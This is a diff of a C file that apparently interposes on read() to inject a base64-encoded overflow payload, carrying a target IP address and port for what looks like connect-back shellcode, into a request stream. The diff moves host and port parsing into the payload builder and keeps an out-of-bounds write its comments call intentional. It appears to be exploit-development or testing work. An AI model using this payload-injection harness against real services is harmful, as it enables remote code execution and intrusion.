@@ -1,7 +1,7 @@
 #define _GNU_SOURCE
 #include <assert.h>
 #include <dlfcn.h>	// For dlsym()
-#include <netdb.h>	// For gethostbyname()
+//#include <netdb.h>	// For gethostbyname()
 #include <stdio.h>	// For i/o
 #include <string.h>	// For str...() and mem...()
 
@@ -17,52 +17,30 @@ static const char s_dumpload[]	= "DUMPLOAD";
 static const char s_overload[]	= "OVERLOAD";
 static const char s_overflow[]	= "OVERFLOW";
 
-// Parse (optional) [ <a.b.c.d> | <hostname> ] <:port>
-static ssize_t parseHostAndPort(char *p, struct in_addr *ipAddress, unsigned short *port) {
-	char s_host[256];
-	unsigned short nport;
-	int nc = 0, ns = sscanf(p, "%[A-Za-z0-9-.]%n:%hu%n", s_host, &nc, &nport, &nc);
-	assert(ns >= 0 && ns <= 2);
+// In-place substitution of request with result. So wrong...
+static ssize_t falseEcho(PayloadPtr plp, char *p, ssize_t np, ssize_t  nc) {
+        // Generate the payload that we will "echo" back
+        unsigned char sPayload64[4096];
+        size_t nPayload64 = b64Encode((const unsigned char *) plp, sizeof(*plp), sPayload64, sizeof(sPayload64));
 
-	*port = htons((ns > 1) ? nport : 5555);
+        // Make room for the payload (where the request used to be).
+        char *src = p + nc;
+        char *dst = p + nPayload64 - strlen(s_fullmagic) + strlen(s_basemagic) - strlen(s_makeload) + strlen(s_overflow);
+        int delta = dst - src;
+        memmove(dst, src, np - nc);
 
-	// See if the s_host string can be parsed by inet_aton()
-	if (inet_aton(s_host, ipAddress) == 0)
-		for (struct hostent *he = gethostbyname(s_host); he; he = NULL)
-			for (int i = 0; ((struct in_addr **) he->h_addr_list)[i] != NULL; i++)
- 				*ipAddress = *((struct in_addr **) he->h_addr_list)[i];
+        // Replace s_fullmagic with s_basemagic
+        memcpy(p - strlen(s_makeload) - strlen(s_fullmagic), s_basemagic, strlen(s_basemagic));
+        p += strlen(s_basemagic) - strlen(s_fullmagic);
 
-	// Return number of characters consumed parsing the Host and IP Address.
-	return nc;
-} // parseHostAndPort()
+        // Replace s_makeload with s_overflow
+        memcpy(p - strlen(s_makeload), s_overflow, strlen(s_overflow));
+        p += strlen(s_overflow) - strlen(s_makeload);
 
-// In-place substitution of request with result. So wrong... 
-static ssize_t falseEcho(PayloadPtr plp, char *p, ssize_t np) {
-	// Parse the IP Address and port into our payload
-	int nc = parseHostAndPort(p, &plp->pl_scu.sc.ipAddress, &plp->pl_scu.sc.port);
-	
-	// Generate the payload that we will "echo" back
-	unsigned char sPayload64[4096];
-	size_t nPayload64 = b64Encode((const unsigned char *) plp, sizeof(*plp), sPayload64, sizeof(sPayload64));
+        // Place the payload in the newly created space
+        memcpy(p, sPayload64, nPayload64);
 
-	// Make room for the payload (where the request used to be).
-	char *src = p + nc;
-	char *dst = p + nPayload64 - strlen(s_fullmagic) + strlen(s_basemagic) - strlen(s_makeload) + strlen(s_overflow);
-	int delta = dst - src;
-	memmove(dst, src, np - nc);
-
-	// Replace s_fullmagic with s_basemagic
-	memcpy(p - strlen(s_makeload) - strlen(s_fullmagic), s_basemagic, strlen(s_basemagic));
-	p += strlen(s_basemagic) - strlen(s_fullmagic);
-
-	// Replace s_makeload with s_overflow
-	memcpy(p - strlen(s_makeload), s_overflow, strlen(s_overflow));
-	p += strlen(s_overflow) - strlen(s_makeload);
-
-	// Place the payload in the newly created space
-	memcpy(p, sPayload64, nPayload64);
-
-	return delta;
+        return delta;
 } // falseEcho()
 
 // IDENTICAL to overflow(), but with two dumpload() calls for debugging.
@@ -110,9 +88,9 @@ ssize_t read(int fd, void *buf, size_t count) {
 		if (!strncmp(s_makeload, p, strlen(s_makeload))) {
 			p += strlen(s_makeload);
 
-			makeload(&payload, &baseAddresses);
+			result += makeload(&payload, &baseAddresses, p, result - (p - (char *)buf));
 
-			result += falseEcho(&payload, p, result - (p - (char *)buf));
+			result += falseEcho(&payload, p, result - (p - (char *)buf), result);
 
 			// Unbounded out-of-bounds write that is intentional and "ok" for us now (considering everything else)
 			((char *) buf)[result] = 0;
@@ -141,10 +119,7 @@ int main(int argc, char **argv)
 
 	Payload payload;
 	initload(&payload);
-	makeload(&payload, &baseAddresses);
-	if (argc > 1)
-		parseHostAndPort(argv[1], &payload.pl_scu.sc.ipAddress, &payload.pl_scu.sc.port);
-
+	makeload(&payload, &baseAddresses, (argc > 1) ? argv[1] : NULL, (argc > 1) ? strlen(argv[1]) : 0);
 	overload(&payload, sizeof(payload), &baseAddresses);
 } // main()
 #endif
